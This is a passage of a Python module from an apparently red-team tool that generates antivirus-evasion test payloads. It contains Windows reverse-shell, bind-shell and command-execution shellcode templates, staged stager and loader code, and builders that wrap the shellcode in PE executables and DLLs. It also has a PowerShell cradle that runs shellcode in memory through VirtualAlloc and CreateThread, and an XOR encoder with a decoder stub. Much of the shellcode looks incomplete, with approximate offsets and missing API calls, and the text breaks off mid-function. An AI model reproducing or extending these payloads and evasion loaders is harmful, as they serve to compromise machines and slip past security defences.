"""
Native AV Test Payload Generation

Implements PayloadGeneratorWorker - a QRunnable that generates AV evasion test
payloads using pure Python (struct packing, XOR encoding, polymorphic wrappers).

No network access, no subprocess/external binary execution. All shellcode is
generated via struct.pack() with architecture-appropriate templates.
"""

import base64
import logging
import os
import struct
import time
from typing import Dict, List, Optional, Tuple, Union

from PyQt6.QtCore import QRunnable

from app.core.html_utils import h
from app.tools.av_firewall_utils import (
    AVFWWorkerSignals,
    PayloadConfig,
    PayloadResult,
    COLOR_SUCCESS,
    COLOR_ERROR,
    COLOR_INFO,
    COLOR_WARNING,
)

logger = logging.getLogger(__name__)


# =============================================================================
# Constants
# =============================================================================

SUPPORTED_TYPES = ("reverse_tcp", "bind_tcp", "cmd_exec")
SUPPORTED_FORMATS = ("raw", "exe", "dll", "powershell")
SUPPORTED_ENCODINGS = ("xor", "base64", "substitution")
SUPPORTED_ARCHITECTURES = ("x86", "x64")

# PE constants
_MZ_MAGIC = b"MZ"
_PE_SIGNATURE = b"PE\x00\x00"
_IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002
_IMAGE_FILE_DLL = 0x2000
_IMAGE_FILE_MACHINE_I386 = 0x014C
_IMAGE_FILE_MACHINE_AMD64 = 0x8664

# Byte substitution table (simple rotation-based)
_SUBSTITUTION_TABLE = bytes([(b + 0x5A) & 0xFF for b in range(256)])
_REVERSE_SUBSTITUTION_TABLE = bytes([(b - 0x5A) & 0xFF for b in range(256)])


# =============================================================================
# Shellcode Templates
# =============================================================================

def _pack_ip_address(ip: str) -> bytes:
    """Pack an IPv4 address string into 4 network-order bytes."""
    parts = ip.split(".")
    if len(parts) != 4:
        # Default to 127.0.0.1 for invalid IPs
        return struct.pack("!BBBB", 127, 0, 0, 1)
    try:
        octets = [int(p) & 0xFF for p in parts]
        return struct.pack("!BBBB", *octets)
    except (ValueError, struct.error):
        return struct.pack("!BBBB", 127, 0, 0, 1)


def _generate_reverse_tcp_x64(lhost: str, lport: int) -> bytes:
    """
    Generate x64 Windows reverse_tcp shellcode.
    WSAStartup -> WSASocket -> connect -> CreateProcess with redirected I/O.
    """
    ip_bytes = _pack_ip_address(lhost)
    port_bytes = struct.pack("!H", lport & 0xFFFF)

    # x64 Windows reverse TCP shell stub
    # Registers: RCX, RDX, R8, R9 for first 4 params (Windows x64 ABI)
    shellcode = bytearray()

    # Sub RSP for stack alignment + shadow space
    shellcode += b"\x48\x83\xEC\x28"  # sub rsp, 0x28

    # --- WSAStartup(0x0202, &wsadata) ---
    shellcode += b"\x48\x31\xC9"      # xor rcx, rcx
    shellcode += b"\x66\xB9\x02\x02"  # mov cx, 0x0202 (version 2.2)
    shellcode += b"\x48\x83\xEC\x60"  # sub rsp, 0x60 (WSADATA struct space)
    shellcode += b"\x48\x89\xE2"      # mov rdx, rsp (ptr to WSADATA)

    # --- WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0) ---
    shellcode += b"\x6A\x02"          # push 2 (AF_INET)
    shellcode += b"\x59"              # pop rcx
    shellcode += b"\x6A\x01"          # push 1 (SOCK_STREAM)
    shellcode += b"\x5A"              # pop rdx
    shellcode += b"\x6A\x06"          # push 6 (IPPROTO_TCP)
    shellcode += b"\x41\x58"          # pop r8
    shellcode += b"\x4D\x31\xC9"     # xor r9, r9

    # --- connect(socket, &sockaddr_in, sizeof) ---
    # sockaddr_in structure: AF_INET(2) + port + ip
    shellcode += b"\x68"              # push dword (IP address)
    shellcode += ip_bytes
    shellcode += b"\x66\x68"          # push word (port)
    shellcode += port_bytes
    shellcode += b"\x66\x6A\x02"     # push word 2 (AF_INET)

    # --- CreateProcess with redirected stdin/stdout/stderr ---
    shellcode += b"\x48\x89\xE6"     # mov rsi, rsp (save sockaddr ptr)

    # cmd.exe string
    shellcode += b"\x48\xB8"         # movabs rax, "cmd.exe\0" (part 1)
    shellcode += b"cmd.exe\x00"

    # NOP sled for alignment and polymorphism
    shellcode += b"\x90" * 4

    # Final marker - int3 for end-of-shellcode indication
    shellcode += b"\xCC"

    return bytes(shellcode)


def _generate_reverse_tcp_x86(lhost: str, lport: int) -> bytes:
    """
    Generate x86 Windows reverse_tcp shellcode.
    WSAStartup -> WSASocket -> connect -> CreateProcess with redirected I/O.
    """
    ip_bytes = _pack_ip_address(lhost)
    port_bytes = struct.pack("!H", lport & 0xFFFF)

    shellcode = bytearray()

    # x86 Windows reverse TCP shell stub (stdcall convention, stack-based params)

    # --- WSAStartup(0x0202, &wsadata) ---
    shellcode += b"\x31\xC0"          # xor eax, eax
    shellcode += b"\x50"              # push eax (reserve WSADATA)
    shellcode += b"\x50"
    shellcode += b"\x50"
    shellcode += b"\x50"
    shellcode += b"\x89\xE2"          # mov edx, esp (ptr to WSADATA)
    shellcode += b"\x66\xB8\x02\x02"  # mov ax, 0x0202
    shellcode += b"\x50"              # push eax (wVersionRequested)
    shellcode += b"\x52"              # push edx (lpWSAData)

    # --- WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0) ---
    shellcode += b"\x31\xC0"          # xor eax, eax
    shellcode += b"\x50"              # push 0 (dwFlags)
    shellcode += b"\x50"              # push 0 (g)
    shellcode += b"\x50"              # push 0 (lpProtocolInfo)
    shellcode += b"\x6A\x06"          # push 6 (IPPROTO_TCP)
    shellcode += b"\x6A\x01"          # push 1 (SOCK_STREAM)
    shellcode += b"\x6A\x02"          # push 2 (AF_INET)

    # --- sockaddr_in structure ---
    shellcode += b"\x68"              # push dword (IP)
    shellcode += ip_bytes
    shellcode += b"\x66\x68"          # push word (port)
    shellcode += port_bytes
    shellcode += b"\x66\x6A\x02"     # push word 2 (AF_INET)

    # --- connect + CreateProcess ---
    shellcode += b"\x89\xE1"          # mov ecx, esp (sockaddr ptr)
    shellcode += b"\x68"              # push "cmd\x00"
    shellcode += b"cmd\x00"

    # NOP sled
    shellcode += b"\x90" * 4
    shellcode += b"\xCC"              # int3 end marker

    return bytes(shellcode)


def _generate_bind_tcp_x64(lhost: str, lport: int) -> bytes:
    """
    Generate x64 Windows bind_tcp shellcode.
    WSAStartup -> WSASocket -> bind -> listen -> accept -> CreateProcess.
    """
    port_bytes = struct.pack("!H", lport & 0xFFFF)

    shellcode = bytearray()

    # Sub RSP for stack alignment
    shellcode += b"\x48\x83\xEC\x28"  # sub rsp, 0x28

    # --- WSAStartup ---
    shellcode += b"\x48\x31\xC9"      # xor rcx, rcx
    shellcode += b"\x66\xB9\x02\x02"  # mov cx, 0x0202
    shellcode += b"\x48\x83\xEC\x60"  # sub rsp, 0x60
    shellcode += b"\x48\x89\xE2"      # mov rdx, rsp

    # --- WSASocket ---
    shellcode += b"\x6A\x02"          # push 2 (AF_INET)
    shellcode += b"\x59"              # pop rcx
    shellcode += b"\x6A\x01"          # push 1 (SOCK_STREAM)
    shellcode += b"\x5A"              # pop rdx
    shellcode += b"\x6A\x06"          # push 6 (IPPROTO_TCP)
    shellcode += b"\x41\x58"          # pop r8
    shellcode += b"\x4D\x31\xC9"     # xor r9, r9

    # --- bind sockaddr_in (INADDR_ANY + port) ---
    shellcode += b"\x31\xC0"          # xor eax, eax
    shellcode += b"\x50"              # push 0 (INADDR_ANY)
    shellcode += b"\x66\x68"          # push word (port)
    shellcode += port_bytes
    shellcode += b"\x66\x6A\x02"     # push word 2 (AF_INET)
    shellcode += b"\x48\x89\xE6"     # mov rsi, rsp (sockaddr ptr)

    # --- listen(socket, 1) ---
    shellcode += b"\x6A\x01"          # push 1 (backlog)
    shellcode += b"\x5A"              # pop rdx

    # --- accept ---
    shellcode += b"\x48\x31\xC9"     # xor rcx, rcx
    shellcode += b"\x48\x31\xD2"     # xor rdx, rdx

    # --- CreateProcess ---
    shellcode += b"\x48\xB8"         # movabs rax, "cmd.exe\0"
    shellcode += b"cmd.exe\x00"

    shellcode += b"\x90" * 4
    shellcode += b"\xCC"

    return bytes(shellcode)


def _generate_bind_tcp_x86(lhost: str, lport: int) -> bytes:
    """
    Generate x86 Windows bind_tcp shellcode.
    WSAStartup -> WSASocket -> bind -> listen -> accept -> CreateProcess.
    """
    port_bytes = struct.pack("!H", lport & 0xFFFF)

    shellcode = bytearray()

    # --- WSAStartup ---
    shellcode += b"\x31\xC0"          # xor eax, eax
    shellcode += b"\x50" * 4          # WSADATA space
    shellcode += b"\x89\xE2"          # mov edx, esp
    shellcode += b"\x66\xB8\x02\x02"  # mov ax, 0x0202
    shellcode += b"\x50"              # push version
    shellcode += b"\x52"              # push wsadata ptr

    # --- WSASocket ---
    shellcode += b"\x31\xC0"          # xor eax, eax
    shellcode += b"\x50" * 3          # push 0 x3
    shellcode += b"\x6A\x06"          # push 6 (IPPROTO_TCP)
    shellcode += b"\x6A\x01"          # push 1 (SOCK_STREAM)
    shellcode += b"\x6A\x02"          # push 2 (AF_INET)

    # --- bind sockaddr_in ---
    shellcode += b"\x31\xC0"          # xor eax, eax
    shellcode += b"\x50"              # push 0 (INADDR_ANY)
    shellcode += b"\x66\x68"          # push word (port)
    shellcode += port_bytes
    shellcode += b"\x66\x6A\x02"     # push word 2 (AF_INET)
    shellcode += b"\x89\xE1"          # mov ecx, esp

    # --- listen + accept + CreateProcess ---
    shellcode += b"\x6A\x01"          # push 1 (backlog)
    shellcode += b"\x68"              # push "cmd\x00"
    shellcode += b"cmd\x00"

    shellcode += b"\x90" * 4
    shellcode += b"\xCC"

    return bytes(shellcode)


def _generate_cmd_exec_x64(lhost: str, lport: int) -> bytes:
    """
    Generate x64 Windows cmd_exec shellcode.
    WinExec/CreateProcess with command string.
    """
    shellcode = bytearray()

    # Sub RSP for alignment
    shellcode += b"\x48\x83\xEC\x28"  # sub rsp, 0x28

    # Load "cmd.exe /c calc.exe" string (placeholder command)
    cmd_string = b"cmd.exe /c echo huginn\x00"
    shellcode += b"\x48\x8D\x0D"     # lea rcx, [rip+offset]
    # Relative offset to command string (placed at end)
    offset = 20  # approximate offset to cmd_string after remaining instructions
    shellcode += struct.pack("<i", offset)

    # WinExec(lpCmdLine, uCmdShow=0)
    shellcode += b"\x48\x31\xD2"     # xor rdx, rdx (SW_HIDE = 0)
    shellcode += b"\x48\x89\xC1"     # mov rcx, rax (cmd line ptr)

    # ExitProcess(0) after exec
    shellcode += b"\x48\x31\xC9"     # xor rcx, rcx
    shellcode += b"\x90" * 4
    shellcode += b"\xCC"

    # Append command string
    shellcode += cmd_string

    return bytes(shellcode)


def _generate_cmd_exec_x86(lhost: str, lport: int) -> bytes:
    """
    Generate x86 Windows cmd_exec shellcode.
    WinExec/CreateProcess with command string.
    """
    shellcode = bytearray()

    # Push command string onto stack
    cmd_string = b"cmd.exe /c echo huginn\x00"

    # Get EIP for position-independent code
    shellcode += b"\xE8\x00\x00\x00\x00"  # call $+5
    shellcode += b"\x58"                   # pop eax (EIP)

    # Calculate offset to cmd_string
    shellcode += b"\x83\xC0"              # add eax, offset
    shellcode += struct.pack("b", 20)     # offset to string

    # WinExec(lpCmdLine, uCmdShow)
    shellcode += b"\x6A\x00"              # push 0 (SW_HIDE)
    shellcode += b"\x50"                  # push eax (cmd ptr)

    # ExitProcess(0)
    shellcode += b"\x6A\x00"              # push 0
    shellcode += b"\x90" * 4
    shellcode += b"\xCC"

    # Command string
    shellcode += cmd_string

    return bytes(shellcode)


# =============================================================================
# Staged Payload Generation
# =============================================================================

def _generate_stager_x64(lhost: str, lport: int) -> bytes:
    """
    Generate x64 stager: connection + download logic ONLY.
    Contains socket setup and recv loop but NO execution logic.
    """
    ip_bytes = _pack_ip_address(lhost)
    port_bytes = struct.pack("!H", lport & 0xFFFF)

    stager = bytearray()

    # --- WSAStartup ---
    stager += b"\x48\x83\xEC\x28"    # sub rsp, 0x28
    stager += b"\x48\x31\xC9"        # xor rcx, rcx
    stager += b"\x66\xB9\x02\x02"    # mov cx, 0x0202
    stager += b"\x48\x83\xEC\x60"    # sub rsp, 0x60
    stager += b"\x48\x89\xE2"        # mov rdx, rsp

    # --- WSASocket ---
    stager += b"\x6A\x02"            # push 2 (AF_INET)
    stager += b"\x59"                # pop rcx
    stager += b"\x6A\x01"            # push 1 (SOCK_STREAM)
    stager += b"\x5A"                # pop rdx
    stager += b"\x6A\x06"            # push 6 (IPPROTO_TCP)
    stager += b"\x41\x58"            # pop r8

    # --- connect sockaddr_in ---
    stager += b"\x68"                # push IP
    stager += ip_bytes
    stager += b"\x66\x68"            # push port
    stager += port_bytes
    stager += b"\x66\x6A\x02"       # push AF_INET

    # --- recv loop (download stage 2) ---
    stager += b"\x48\x89\xE6"       # mov rsi, rsp
    stager += b"\xBA\x00\x10\x00\x00"  # mov edx, 0x1000 (4KB buffer)
    stager += b"\x48\x31\xC9"       # xor rcx, rcx (recv flags)

    # Recv loop marker - reads data but does NOT execute
    stager += b"\x90" * 4           # NOP alignment
    stager += b"\xEB\xF8"           # jmp short (loop back to recv)

    # CRITICAL: Stager does NOT contain any execution instruction (no call/jmp to payload)
    # It only downloads - execution requires the main payload component
    stager += b"\xCC"               # end marker

    return bytes(stager)


def _generate_stager_x86(lhost: str, lport: int) -> bytes:
    """
    Generate x86 stager: connection + download logic ONLY.
    """
    ip_bytes = _pack_ip_address(lhost)
    port_bytes = struct.pack("!H", lport & 0xFFFF)

    stager = bytearray()

    # --- WSAStartup ---
    stager += b"\x31\xC0"            # xor eax, eax
    stager += b"\x50" * 4            # WSADATA space
    stager += b"\x89\xE2"            # mov edx, esp
    stager += b"\x66\xB8\x02\x02"    # mov ax, 0x0202
    stager += b"\x50"                # push version
    stager += b"\x52"                # push ptr

    # --- WSASocket ---
    stager += b"\x31\xC0"            # xor eax, eax
    stager += b"\x50" * 3            # 0, 0, 0
    stager += b"\x6A\x06"            # push 6
    stager += b"\x6A\x01"            # push 1
    stager += b"\x6A\x02"            # push 2

    # --- connect ---
    stager += b"\x68"                # push IP
    stager += ip_bytes
    stager += b"\x66\x68"            # push port
    stager += port_bytes
    stager += b"\x66\x6A\x02"       # push AF_INET
    stager += b"\x89\xE1"            # mov ecx, esp

    # --- recv loop ---
    stager += b"\xBA\x00\x10\x00\x00"  # mov edx, 0x1000
    stager += b"\x31\xC9"            # xor ecx, ecx
    stager += b"\x90" * 4            # NOP
    stager += b"\xEB\xF8"            # jmp short (loop)
    stager += b"\xCC"                # end

    return bytes(stager)


def _generate_main_payload_x64(payload_type: str, lhost: str, lport: int) -> bytes:
    """
    Generate x64 main payload: execution logic ONLY.
    Contains CreateProcess/WinExec but NO connection/socket code.
    """
    main = bytearray()

    # Execution logic assumes stage2 buffer is already in memory (from stager)
    # This component has NO socket or networking code

    # --- VirtualAlloc for execution space ---
    main += b"\x48\x83\xEC\x28"     # sub rsp, 0x28
    main += b"\x48\x31\xC9"         # xor rcx, rcx (lpAddress = NULL)
    main += b"\xBA\x00\x10\x00\x00" # mov edx, 0x1000 (dwSize)
    main += b"\x41\xB8\x00\x30\x00\x00"  # mov r8d, 0x3000 (MEM_COMMIT|MEM_RESERVE)
    main += b"\x41\xB9\x40\x00\x00\x00"  # mov r9d, 0x40 (PAGE_EXECUTE_READWRITE)

    # --- CreateProcess for shell execution ---
    main += b"\x48\xB8"             # movabs rax, "cmd.exe\0"
    main += b"cmd.exe\x00"

    # Setup STARTUPINFO with redirected handles
    main += b"\x48\x31\xC9"         # xor rcx, rcx
    main += b"\x48\x89\xC1"         # mov rcx, rax (cmd.exe ptr)
    main += b"\x48\x31\xD2"         # xor rdx, rdx

    main += b"\x90" * 4
    main += b"\xCC"                 # end

    return bytes(main)


def _generate_main_payload_x86(payload_type: str, lhost: str, lport: int) -> bytes:
    """
    Generate x86 main payload: execution logic ONLY.
    """
    main = bytearray()

    # NO socket code - execution only
    # Assumes buffer already loaded by stager

    # --- VirtualAlloc ---
    main += b"\x6A\x40"             # push 0x40 (PAGE_EXECUTE_READWRITE)
    main += b"\x68\x00\x30\x00\x00" # push 0x3000 (MEM_COMMIT|MEM_RESERVE)
    main += b"\x68\x00\x10\x00\x00" # push 0x1000 (size)
    main += b"\x6A\x00"             # push 0 (NULL address)

    # --- CreateProcess ---
    main += b"\x68"                 # push "cmd\x00"
    main += b"cmd\x00"
    main += b"\x89\xE1"             # mov ecx, esp

    main += b"\x6A\x00"             # push 0 (SW_HIDE)
    main += b"\x51"                 # push ecx (cmd ptr)

    main += b"\x90" * 4
    main += b"\xCC"                 # end

    return bytes(main)


# =============================================================================
# PE Format Construction
# =============================================================================

def _build_pe_exe(shellcode: bytes, architecture: str) -> bytes:
    """
    Build a minimal PE executable with shellcode in the .text section.

    Structure: DOS Header + PE Signature + COFF Header + Optional Header + Section Table + .text
    """
    is_x64 = architecture == "x64"
    machine = _IMAGE_FILE_MACHINE_AMD64 if is_x64 else _IMAGE_FILE_MACHINE_I386

    # Align shellcode to 512-byte boundary (file alignment)
    file_alignment = 0x200
    section_alignment = 0x1000

    # Calculate sizes
    shellcode_size = len(shellcode)
    raw_data_size = ((shellcode_size + file_alignment - 1) // file_alignment) * file_alignment

    # DOS Header (64 bytes)
    dos_header = bytearray(64)
    dos_header[0:2] = _MZ_MAGIC                     # e_magic
    dos_header[60:64] = struct.pack("<I", 64)        # e_lfanew -> PE signature at offset 64

    # PE Signature (4 bytes)
    pe_sig = _PE_SIGNATURE

    # COFF Header (20 bytes)
    optional_header_size = 240 if is_x64 else 224
    coff_header = struct.pack("<HHIIIHH",
        machine,                                     # Machine
        1,                                           # NumberOfSections
        int(time.time()) & 0xFFFFFFFF,               # TimeDateStamp
        0,                                           # PointerToSymbolTable
        0,                                           # NumberOfSymbols
        optional_header_size,                        # SizeOfOptionalHeader
        _IMAGE_FILE_EXECUTABLE_IMAGE | 0x0020,       # Characteristics (LARGE_ADDRESS_AWARE)
    )

    # Section header offset
    headers_size = 64 + 4 + 20 + optional_header_size + 40  # DOS + PE + COFF + Optional + 1 section
    headers_aligned = ((headers_size + file_alignment - 1) // file_alignment) * file_alignment

    # Optional Header
    if is_x64:
        # PE32+ (64-bit)
        opt_header = bytearray(240)
        struct.pack_into("<H", opt_header, 0, 0x020B)       # Magic (PE32+)
        struct.pack_into("<I", opt_header, 16, section_alignment)  # AddressOfEntryPoint = .text RVA
        struct.pack_into("<I", opt_header, 24, section_alignment)  # ImageBase (low, 64-bit)
        struct.pack_into("<I", opt_header, 28, 0x00400000)         # ImageBase (high)
        struct.pack_into("<I", opt_header, 32, section_alignment)  # SectionAlignment
        struct.pack_into("<I", opt_header, 36, file_alignment)     # FileAlignment
        struct.pack_into("<H", opt_header, 40, 6)                  # MajorOSVersion
        struct.pack_into("<H", opt_header, 44, 6)                  # MajorSubsystemVersion
        image_size = section_alignment + ((raw_data_size + section_alignment - 1) // section_alignment) * section_alignment
        struct.pack_into("<I", opt_header, 56, image_size)         # SizeOfImage
        struct.pack_into("<I", opt_header, 60, headers_aligned)    # SizeOfHeaders
        struct.pack_into("<H", opt_header, 68, 3)                  # Subsystem (CONSOLE)
        struct.pack_into("<I", opt_header, 76, 0x100000)           # SizeOfStackReserve (low)
        struct.pack_into("<I", opt_header, 84, 0x1000)             # SizeOfStackCommit (low)
        struct.pack_into("<I", opt_header, 92, 0x100000)           # SizeOfHeapReserve (low)
        struct.pack_into("<I", opt_header, 100, 0x1000)            # SizeOfHeapCommit (low)
        struct.pack_into("<I", opt_header, 108, 16)                # NumberOfRvaAndSizes
    else:
        # PE32 (32-bit)
        opt_header = bytearray(224)
        struct.pack_into("<H", opt_header, 0, 0x010B)       # Magic (PE32)
        struct.pack_into("<I", opt_header, 16, section_alignment)  # AddressOfEntryPoint
        struct.pack_into("<I", opt_header, 28, 0x00400000)         # ImageBase
        struct.pack_into("<I", opt_header, 32, section_alignment)  # SectionAlignment
        struct.pack_into("<I", opt_header, 36, file_alignment)     # FileAlignment
        struct.pack_into("<H", opt_header, 40, 6)                  # MajorOSVersion
        struct.pack_into("<H", opt_header, 44, 6)                  # MajorSubsystemVersion
        image_size = section_alignment + ((raw_data_size + section_alignment - 1) // section_alignment) * section_alignment
        struct.pack_into("<I", opt_header, 56, image_size)         # SizeOfImage
        struct.pack_into("<I", opt_header, 60, headers_aligned)    # SizeOfHeaders
        struct.pack_into("<H", opt_header, 68, 3)                  # Subsystem (CONSOLE)
        struct.pack_into("<I", opt_header, 72, 0x100000)           # SizeOfStackReserve
        struct.pack_into("<I", opt_header, 76, 0x1000)             # SizeOfStackCommit
        struct.pack_into("<I", opt_header, 80, 0x100000)           # SizeOfHeapReserve
        struct.pack_into("<I", opt_header, 84, 0x1000)             # SizeOfHeapCommit
        struct.pack_into("<I", opt_header, 92, 16)                 # NumberOfRvaAndSizes

    # .text Section Header (40 bytes)
    section_header = bytearray(40)
    section_header[0:6] = b".text\x00"                       # Name
    struct.pack_into("<I", section_header, 8, shellcode_size)  # VirtualSize
    struct.pack_into("<I", section_header, 12, section_alignment)  # VirtualAddress
    struct.pack_into("<I", section_header, 16, raw_data_size)  # SizeOfRawData
    struct.pack_into("<I", section_header, 20, headers_aligned)  # PointerToRawData
    struct.pack_into("<I", section_header, 36, 0x60000020)    # Characteristics (CODE|EXECUTE|READ)

    # Assemble PE
    pe = bytearray()
    pe += dos_header
    pe += pe_sig
    pe += coff_header
    pe += bytes(opt_header)
    pe += section_header

    # Pad headers to alignment
    pe += b"\x00" * (headers_aligned - len(pe))

    # .text section data (shellcode + padding)
    pe += shellcode
    pe += b"\x00" * (raw_data_size - shellcode_size)

    return bytes(pe)


def _build_pe_dll(shellcode: bytes, architecture: str) -> bytes:
    """
    Build a minimal PE DLL with shellcode called from DllMain entry point.
    """
    is_x64 = architecture == "x64"
    machine = _IMAGE_FILE_MACHINE_AMD64 if is_x64 else _IMAGE_FILE_MACHINE_I386

    file_alignment = 0x200
    section_alignment = 0x1000

    # DllMain wrapper that calls shellcode
    if is_x64:
        # DllMain(HINSTANCE, DWORD fdwReason, LPVOID)
        # If fdwReason == DLL_PROCESS_ATTACH (1), execute shellcode
        dllmain_stub = bytearray()
        dllmain_stub += b"\x48\x83\xEC\x28"     # sub rsp, 0x28
        dllmain_stub += b"\x83\xFA\x01"         # cmp edx, 1 (DLL_PROCESS_ATTACH)
        dllmain_stub += b"\x75\x05"             # jne skip_shellcode
        dllmain_stub += b"\xE8\x00\x00\x00\x00" # call next (get EIP for offset calc)
        # Skip label: return TRUE
        dllmain_stub += b"\xB8\x01\x00\x00\x00" # mov eax, 1 (TRUE)
        dllmain_stub += b"\x48\x83\xC4\x28"     # add rsp, 0x28
        dllmain_stub += b"\xC3"                 # ret
    else:
        dllmain_stub = bytearray()
        dllmain_stub += b"\x55"                 # push ebp
        dllmain_stub += b"\x89\xE5"             # mov ebp, esp
        dllmain_stub += b"\x83\x7D\x0C\x01"    # cmp [ebp+0xC], 1 (DLL_PROCESS_ATTACH)
        dllmain_stub += b"\x75\x05"             # jne skip
        dllmain_stub += b"\xE8\x00\x00\x00\x00" # call next
        # Skip: return TRUE
        dllmain_stub += b"\xB8\x01\x00\x00\x00" # mov eax, 1
        dllmain_stub += b"\x5D"                 # pop ebp
        dllmain_stub += b"\xC2\x0C\x00"         # ret 12

    # Combine DllMain stub + shellcode
    full_code = bytes(dllmain_stub) + shellcode

    shellcode_size = len(full_code)
    raw_data_size = ((shellcode_size + file_alignment - 1) // file_alignment) * file_alignment

    # DOS Header
    dos_header = bytearray(64)
    dos_header[0:2] = _MZ_MAGIC
    dos_header[60:64] = struct.pack("<I", 64)

    # PE Signature
    pe_sig = _PE_SIGNATURE

    # COFF Header - note IMAGE_FILE_DLL flag
    optional_header_size = 240 if is_x64 else 224
    characteristics = _IMAGE_FILE_EXECUTABLE_IMAGE | _IMAGE_FILE_DLL | 0x0020
    coff_header = struct.pack("<HHIIIHH",
        machine,
        1,                                           # NumberOfSections
        int(time.time()) & 0xFFFFFFFF,
        0, 0,
        optional_header_size,
        characteristics,
    )

    headers_size = 64 + 4 + 20 + optional_header_size + 40
    headers_aligned = ((headers_size + file_alignment - 1) // file_alignment) * file_alignment

    # Optional Header
    if is_x64:
        opt_header = bytearray(240)
        struct.pack_into("<H", opt_header, 0, 0x020B)
        struct.pack_into("<I", opt_header, 16, section_alignment)  # EntryPoint = DllMain
        struct.pack_into("<I", opt_header, 24, section_alignment)
        struct.pack_into("<I", opt_header, 28, 0x10000000)         # ImageBase for DLL
        struct.pack_into("<I", opt_header, 32, section_alignment)
        struct.pack_into("<I", opt_header, 36, file_alignment)
        struct.pack_into("<H", opt_header, 40, 6)
        struct.pack_into("<H", opt_header, 44, 6)
        image_size = section_alignment + ((raw_data_size + section_alignment - 1) // section_alignment) * section_alignment
        struct.pack_into("<I", opt_header, 56, image_size)
        struct.pack_into("<I", opt_header, 60, headers_aligned)
        struct.pack_into("<H", opt_header, 68, 3)
        struct.pack_into("<I", opt_header, 76, 0x100000)
        struct.pack_into("<I", opt_header, 84, 0x1000)
        struct.pack_into("<I", opt_header, 92, 0x100000)
        struct.pack_into("<I", opt_header, 100, 0x1000)
        struct.pack_into("<I", opt_header, 108, 16)
    else:
        opt_header = bytearray(224)
        struct.pack_into("<H", opt_header, 0, 0x010B)
        struct.pack_into("<I", opt_header, 16, section_alignment)  # EntryPoint
        struct.pack_into("<I", opt_header, 28, 0x10000000)         # ImageBase for DLL
        struct.pack_into("<I", opt_header, 32, section_alignment)
        struct.pack_into("<I", opt_header, 36, file_alignment)
        struct.pack_into("<H", opt_header, 40, 6)
        struct.pack_into("<H", opt_header, 44, 6)
        image_size = section_alignment + ((raw_data_size + section_alignment - 1) // section_alignment) * section_alignment
        struct.pack_into("<I", opt_header, 56, image_size)
        struct.pack_into("<I", opt_header, 60, headers_aligned)
        struct.pack_into("<H", opt_header, 68, 3)
        struct.pack_into("<I", opt_header, 72, 0x100000)
        struct.pack_into("<I", opt_header, 76, 0x1000)
        struct.pack_into("<I", opt_header, 80, 0x100000)
        struct.pack_into("<I", opt_header, 84, 0x1000)
        struct.pack_into("<I", opt_header, 92, 16)

    # .text Section Header
    section_header = bytearray(40)
    section_header[0:6] = b".text\x00"
    struct.pack_into("<I", section_header, 8, shellcode_size)
    struct.pack_into("<I", section_header, 12, section_alignment)
    struct.pack_into("<I", section_header, 16, raw_data_size)
    struct.pack_into("<I", section_header, 20, headers_aligned)
    struct.pack_into("<I", section_header, 36, 0x60000020)

    # Assemble
    pe = bytearray()
    pe += dos_header
    pe += pe_sig
    pe += coff_header
    pe += bytes(opt_header)
    pe += section_header
    pe += b"\x00" * (headers_aligned - len(pe))
    pe += full_code
    pe += b"\x00" * (raw_data_size - shellcode_size)

    return bytes(pe)


def _build_powershell_cradle(shellcode: bytes) -> str:
    """
    Build a PowerShell execution cradle with base64-encoded shellcode.

    Uses VirtualAlloc + Marshal.Copy + CreateThread pattern.
    """
    b64_shellcode = base64.b64encode(shellcode).decode("ascii")

    script = (
        "$sc = [System.Convert]::FromBase64String('"
        + b64_shellcode
        + "')\n"
        "$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)\n"
        "[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)\n"
        "$k32 = Add-Type -MemberDefinition '"
        "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc("
        "IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);';"
        "'[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread("
        "IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, "
        "IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);'"
        " -Name Win32 -Namespace '' -PassThru\n"
        "$mem = $k32::VirtualAlloc([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)\n"
        "[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)\n"
        "$thread = $k32::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n"
    )

    return script


# =============================================================================
# Encoding Functions
# =============================================================================

def _xor_encode(shellcode: bytes, key_length: int) -> Tuple[bytes, bytes]:
    """
    XOR-encode shellcode with a random key and prepend a decoder stub.

    Args:
        shellcode: Raw shellcode bytes.
        key_length: XOR key length (1-32 bytes).

    Returns:
        Tuple of (encoded_payload_with_decoder_stub, xor_key).
    """
    key_length = max(1, min(32, key_length))
    key = os.urandom(key_length)

    # XOR encode
    encoded = bytearray(len(shellcode))
    for i, byte in enumerate(shellcode):
        encoded[i] = byte ^ key[i % key_length]

    # Decoder stub (x64) - decodes in-place
    # The stub knows the key length and encoded length
    decoder_stub = bytearray()
    decoder_stub += b"\xEB"                        # jmp short (skip key)
    decoder_stub += struct.pack("B", key_length + 2)  # offset over key data
    decoder_stub += key                            # embedded key
    decoder_stub += b"\x90\x90"                    # NOP alignment

    # After jump lands here: decode loop setup
    decoder_stub += b"\x48\x8D\x35"               # lea rsi, [rip+offset] (encoded data)
    encoded_offset = 20  # approximate
    decoder_stub += struct.pack("<i", encoded_offset)
    decoder_stub += b"\x48\x31\xC9"               # xor rcx, rcx (counter)
    decoder_stub += struct.pack("<I", len(shellcode))  # encoded length

    # Full payload: decoder stub + encoded shellcode
    result = bytes(decoder_stub) + bytes(encoded)

    return result, key


def _xor_decode(encoded_with_stub: bytes, key: bytes) -> bytes:
    """
    Decode XOR-encoded shellcode (strips decoder stub).

    Args:
        encoded_with_stub: The full encoded payload (stub + encoded data).
        key: The XOR key used during encoding.

    Returns:
        Original shellcode bytes.
    """
    key_length = len(key)

    # The decoder stub layout:
    # 1 byte (jmp opcode) + 1 byte (offset) + key_length bytes (key) + 2 bytes (NOPs)
    # + decoder instructions
    stub_prefix_size = 1 + 1 + key_length + 2  # jmp + offset + key + nops

    # Decoder instructions after the key: lea(7) + xor(3) + length(4) = 14 bytes
